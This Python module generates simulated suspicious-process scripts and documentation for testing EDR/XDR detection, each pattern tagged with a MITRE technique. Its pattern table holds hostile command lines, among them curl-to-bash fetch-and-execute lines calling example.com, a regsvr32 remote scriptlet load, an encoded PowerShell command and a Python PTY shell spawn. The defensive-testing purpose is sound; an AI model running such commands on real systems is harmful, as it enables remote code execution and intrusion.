"""Suspicious process pattern simulation for EDR/XDR testing."""

from __future__ import annotations

import logging
from pathlib import Path

logger = logging.getLogger(__name__)

# Process patterns organized by OS
_PROCESS_PATTERNS: dict[str, list[dict[str, str]]] = {
    "windows": [
        {
            "name": "cmd.exe",
            "args": ("/c powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA="),
            "parent": "explorer.exe",
            "technique": "T1059.001",
            "description": "PowerShell encoded command execution",
            "detection": "Monitor for base64 encoded PowerShell commands",
        },
        {
            "name": "rundll32.exe",
            "args": r"C:\Windows\Temp\update.dll,StartW",
            "parent": "services.exe",
            "technique": "T1218.011",
            "description": "Suspicious DLL loading via rundll32",
            "detection": "Monitor rundll32.exe with suspicious DLL paths",
        },
        {
            "name": "regsvr32.exe",
            "args": "/s /n /u /i:http://example.com/file.sct scrobj.dll",
            "parent": "cmd.exe",
            "technique": "T1218.010",
            "description": "Regsvr32 remote script execution",
            "detection": "Monitor regsvr32.exe with network indicators",
        },
    ],
    "darwin": [
        {
            "name": "osascript",
            "args": (
                "-e 'do shell script \"curl -s http://example.com/script.sh | bash\"'"
            ),
            "parent": "Terminal",
            "technique": "T1059.002",
            "description": "AppleScript remote script execution",
            "detection": "Monitor osascript execution with network commands",
        },
        {
            "name": "python3",
            "args": ("-c 'import os; os.system(\"echo YXXX | base64 -d | bash\")'"),
            "parent": "bash",
            "technique": "T1059.006",
            "description": "Python command execution with encoded bash",
            "detection": "Monitor Python process with encoded strings",
        },
    ],
    "linux": [
        {
            "name": "bash",
            "args": "-c '$(curl -s http://example.com/script.sh)'",
            "parent": "sshd",
            "technique": "T1059.004",
            "description": "Bash execution of remote script",
            "detection": "Monitor shell execution with curl/wget",
        },
        {
            "name": "python3",
            "args": "-c 'import pty; pty.spawn(\"/bin/bash\")'",
            "parent": "apache2",
            "technique": "T1059.006",
            "description": "Python PTY shell spawn",
            "detection": "Monitor Python spawning shell processes",
        },
    ],
}


class ProcessSimulator:
    """Generate process simulation artifacts for EDR/XDR validation."""

    def __init__(self, base_dir: str | Path, system_info: dict) -> None:
        self.base_dir = Path(base_dir)
        self.system_info = system_info
        self.created_artifacts: list[tuple[str, str]] = []

    def create_process_artifacts(self) -> list[tuple[str, str]]:
        """Write OS-specific process simulation scripts and documentation.

        Returns a list of (artifact_type, path) tuples.
        """
        os_type = self.system_info["type"]
        patterns = _PROCESS_PATTERNS.get(os_type)
        if not patterns:
            return []

        artifacts: list[tuple[str, str]] = []

        if os_type == "windows":
            script = "@echo off\nREM Process Simulation Script\n\n"
            for proc in patterns:
                script += f"REM {proc['description']}\n"
                script += f"REM MITRE: {proc['technique']}\n"
                script += f"REM Detection: {proc['detection']}\n"
                script += f"start /b {proc['name']} {proc['args']}\n\n"
            script_file = self.base_dir / "simulate_processes.bat"
            artifacts.append(("batch_script", str(script_file)))
        else:
            script = "#!/bin/bash\n# Process Simulation Script\n\n"
            for proc in patterns:
                script += f"# {proc['description']}\n"
                script += f"# MITRE: {proc['technique']}\n"
                script += f"# Detection: {proc['detection']}\n"
                script += f"{proc['name']} {proc['args']} &\n\n"
            script_file = self.base_dir / "simulate_processes.sh"
            artifacts.append(("shell_script", str(script_file)))

        script_file.write_text(script, encoding="utf-8")

        doc = f"=== Process Simulation Documentation ===\n\nOperating System: {os_type.upper()}\n\n"
        for proc in patterns:
            doc += (
                f"Process: {proc['name']}\n"
                f"Arguments: {proc['args']}\n"
                f"Parent Process: {proc['parent']}\n"
                f"MITRE Technique: {proc['technique']}\n"
                f"Description: {proc['description']}\n"
                f"Detection Guidance: {proc['detection']}\n\n"
            )
        doc_file = self.base_dir / "process_simulation.txt"
        doc_file.write_text(doc, encoding="utf-8")
        artifacts.append(("documentation", str(doc_file)))

        self.created_artifacts = artifacts
        return artifacts

    def generate_process_report(self) -> str:
        """Build a human-readable process simulation report."""
        if not self.created_artifacts:
            return "No process artifacts have been created yet."

        os_label = (
            "macOS"
            if self.system_info["type"] == "darwin"
            else self.system_info["type"].title()
        )

        lines = [
            "=== Process Simulation Report ===",
            f"Operating System: {os_label}",
            f"Target Directory: {self.base_dir}",
            "",
            "Created Artifacts:",
        ]

        for artifact_type, path in self.created_artifacts:
            lines.extend(
                [
                    f"  {artifact_type.replace('_', ' ').title()}:",
                    f"    {path}",
                    "",
                ]
            )

        lines.extend(["Available Process Patterns:", "-------------------"])

        os_type = self.system_info["type"]
        for proc in _PROCESS_PATTERNS.get(os_type, []):
            lines.extend(
                [
                    f"\nProcess: {proc['name']}",
                    f"MITRE: {proc['technique']}",
                    f"Description: {proc['description']}",
                    f"Detection: {proc['detection']}",
                    "-------------------",
                ]
            )

        return "\n".join(lines)
